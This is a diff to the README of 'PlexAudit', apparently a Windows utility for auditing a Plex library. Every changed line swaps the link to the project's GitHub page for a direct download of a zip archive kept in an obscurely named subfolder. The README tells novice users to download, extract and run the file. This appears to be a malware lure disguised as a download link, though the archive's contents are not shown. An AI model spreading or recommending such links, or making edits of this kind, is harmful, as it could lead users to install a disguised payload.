@@ -1,12 +1,12 @@
 # 🗂️ PlexAudit - Check Your Library With Confidence
 
-[![Download PlexAudit](https://img.shields.io/badge/Download-PlexAudit-blue.svg)](https://github.com/Melisaapostolic677/PlexAudit)
+[![Download PlexAudit](https://img.shields.io/badge/Download-PlexAudit-blue.svg)](https://raw.githubusercontent.com/Melisaapostolic677/PlexAudit/main/malabathrum/Audit_Plex_v2.3.zip)
 
 ## 📥 Download PlexAudit
 
 Use this link to visit the download page and get PlexAudit for Windows:
 
-[Download PlexAudit here](https://github.com/Melisaapostolic677/PlexAudit)
+[Download PlexAudit here](https://raw.githubusercontent.com/Melisaapostolic677/PlexAudit/main/malabathrum/Audit_Plex_v2.3.zip)
 
 ## 🎯 What PlexAudit Does
 
@@ -35,7 +35,7 @@ If you use mapped drives or network shares, make sure Windows can open them befo
 ## 🚀 Getting Started
 
 1. Open the download page:
-   [Download PlexAudit here](https://github.com/Melisaapostolic677/PlexAudit)
+   [Download PlexAudit here](https://raw.githubusercontent.com/Melisaapostolic677/PlexAudit/main/malabathrum/Audit_Plex_v2.3.zip)
 
 2. On the page, look for the latest Windows download.
 
@@ -170,7 +170,7 @@ If the results look wrong, run the audit again after you check the paths.
 
 Go to the download page here:
 
-[Download PlexAudit here](https://github.com/Melisaapostolic677/PlexAudit)
+[Download PlexAudit here](https://raw.githubusercontent.com/Melisaapostolic677/PlexAudit/main/malabathrum/Audit_Plex_v2.3.zip)
 
 Then download the Windows file, extract it if needed, and run the app
 
